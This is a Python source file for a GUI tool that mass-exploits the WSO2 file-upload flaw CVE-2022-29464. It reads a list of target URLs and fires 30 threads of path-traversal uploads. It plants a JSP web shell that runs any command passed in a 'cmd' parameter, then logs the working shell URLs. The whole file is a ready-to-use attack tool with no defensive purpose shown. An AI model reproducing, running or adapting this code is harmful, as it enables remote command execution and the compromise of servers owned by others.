import urllib3
import requests
import tkinter as tk
from tkinter import *
from tkinter import scrolledtext
from PIL.ImageTk import PhotoImage
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
shell= '''<%@ page import="java.util.*,java.io.*"%>

<html>
<body>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>'''
public_key = '''KEY'''
def CVE_2022_29464_exp(url):
    try:
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=3, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira": public_key})
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=3, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira.jsp": shell})
        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            CVE_2022_29464_text.insert(END,f"[! ! ! ! ! ! ] Vulnerable url,shell：    {url}/authenticationendpoint/capoeira.jsp\n")
            CVE_2022_29464_text.see(END)
            with open("[exists]WSO2_RCE_url.txt","a+") as f:
                f.write(url + "/authenticationendpoint/capoeira.jsp\n")
        else:
            CVE_2022_29464_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
            CVE_2022_29464_text.see(END)
    except Exception as err:
        CVE_2022_29464_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        CVE_2022_29464_text.see(END)
def get_CVE_2022_29464_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def CVE_2022_29464_gui():
    CVE_2022_29464 = Toplevel()
    CVE_2022_29464.geometry("1035x455")
    CVE_2022_29464.title("WSO2 RCE(CVE-2022-29464) [auto-muti-exp]")
    CVE_2022_29464.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    CVE_2022_29464.tk.call('wm', 'iconphoto', CVE_2022_29464._w, logo)
    global CVE_2022_29464_text
    CVE_2022_29464_text = scrolledtext.ScrolledText(CVE_2022_29464,width=123, height=25)
    CVE_2022_29464_text.grid(row=0, column=0, padx=10, pady=10)
    CVE_2022_29464_text.see(END)
    addrs = get_CVE_2022_29464_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(CVE_2022_29464_exp, addr)
    CVE_2022_29464.mainloop()